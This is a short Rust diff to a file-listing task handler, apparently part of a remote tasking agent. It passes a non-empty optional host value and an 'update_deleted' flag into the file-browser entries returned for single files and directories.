@@ -26,7 +26,6 @@ struct Params {
     #[serde(default)]
     recursive: bool,
     #[serde(default)]
-    #[allow(dead_code)]
     host: Option<String>,
 }
 
@@ -181,6 +180,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         }
     };
 
+    let host = params.host.filter(|h| !h.is_empty());
     if meta.is_file() {
         // Single file listing
         let entry = FileBrowserEntry {
@@ -192,11 +192,13 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             parent_path: resolved
                 .parent()
                 .map(|p| p.to_string_lossy().to_string()),
+            host,
             size: Some(meta.len() as i64),
             access_time: meta.accessed().ok().and_then(to_millis),
             modify_time: meta.modified().ok().and_then(to_millis),
             permissions: permissions_value(&meta),
             success: Some(true),
+            update_deleted: true,
             set_as_user_output: true,
             ..Default::default()
         };
@@ -241,7 +243,9 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                 parent_path: resolved
                     .parent()
                     .map(|p| p.to_string_lossy().to_string()),
+                host,
                 success: Some(true),
+                update_deleted: true,
                 set_as_user_output: true,
                 files,
                 ..Default::default()
